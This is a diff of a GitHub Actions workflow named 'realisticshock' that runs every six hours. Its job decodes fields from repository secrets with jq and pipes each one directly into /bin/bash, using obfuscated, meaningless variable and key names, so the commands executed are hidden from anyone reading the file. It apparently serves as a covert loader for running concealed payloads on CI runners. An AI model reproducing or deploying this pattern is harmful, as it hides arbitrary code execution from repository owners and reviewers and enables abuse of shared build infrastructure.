@@ -2,20 +2,22 @@ name: realisticshock
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 1/6 * * *'
-
+    - cron: '31 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: realisticshock
         env:
-          pe89: ${{ secrets.pe89 }}
+          x09: ${{ secrets.x09 }}
         run: |
-          echo $pe89 | jq -r .kz4175 | /bin/bash
-          echo $rr808 | jq -r .hjlat76 | /bin/bash
-          echo $yk7114 | jq -r .wkyq02390 | /bin/bash
-          echo $yzo734 | jq -r .souv89514 | /bin/bash
-          echo $odsg0810 | jq -r .irsg04 | /bin/bash
+          echo $x09 | jq -r .rzybr3 | /bin/bash
+          echo $rsjxs8105 | jq -r .tnpco45439 | /bin/bash
+          echo $lu40 | jq -r .lp07790 | /bin/bash
+          echo $xbfho5227 | jq -r .w67498 | /bin/bash
+          echo $bqjen7 | jq -r .dtl94 | /bin/bash
+          echo $oy2 | jq -r .ska58 | /bin/bash
+          echo $ji5 | jq -r .sg12 | /bin/bash
 
